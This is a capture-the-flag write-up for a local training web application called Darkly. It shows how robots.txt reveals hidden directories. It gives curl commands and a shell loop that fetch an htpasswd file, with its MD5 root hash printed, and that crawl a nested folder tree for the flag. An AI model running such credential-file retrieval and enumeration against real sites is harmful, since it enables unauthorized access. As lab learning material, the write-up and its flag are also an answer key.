# Search Engine Discovery Breach

## Vulnerability Found
The Darkly web application exposes sensitive information through its `robots.txt` file, leading to information disclosure.

## Commands

```sh
  curl -s http://localhost:8080/robots.txt
  curl -s http://localhost:8080/.htaccess
  curl -s http://localhost:8080/sitemap.xml
  curl -s -I http://localhost:8080/
  curl -s http://localhost:8080/whatever/
  curl -s http://localhost:8080/.hidden/
  curl -s http://localhost:8080/whatever/htpasswd
  curl -s http://localhost:8080/.hidden/README
  curl -s http://localhost:8080/.hidden/whtccjokayshttvxycsvykxcfm/
  curl -s http://localhost:8080/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/README
  curl -s http://localhost:8080/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README

  for dir in $(curl -s http://localhost:8080/.hidden/ | grep -oP 'href="[^/]+/"' | cut -d'"' -f2 | head -5); do
      echo "Checking $dir:";
      curl -s "http://localhost:8080/.hidden/$dir" | grep -E '(README|flag|\.txt)' | head -3;
  done

  python3 search_engine_discovery_exploit.py
```

## Attack Vector
1. **robots.txt exposure** at `http://localhost:8080/robots.txt`
   - Reveals two hidden directories:
     - `/whatever`
     - `/.hidden`

## Findings

### 1. Exposed Password Hash
- Location: `http://localhost:8080/whatever/htpasswd`
- Content: `root:437394baff5aa33daa618be47b75cb49`
- This is an MD5 hash of the root password

### 2. Hidden Directory Structure
- Location: `http://localhost:8080/.hidden/`
- Contains a complex nested directory structure with 18,279 directories
- Each directory contains a README file
- One of the README files contains the flag

### 3. Flag Discovery
- Flag found in one of the README files:
  ```
  d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
  ```

## OWASP Reference
- OWASP Testing Guide: [4.1.1 - Conduct Search Engine Discovery](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage)
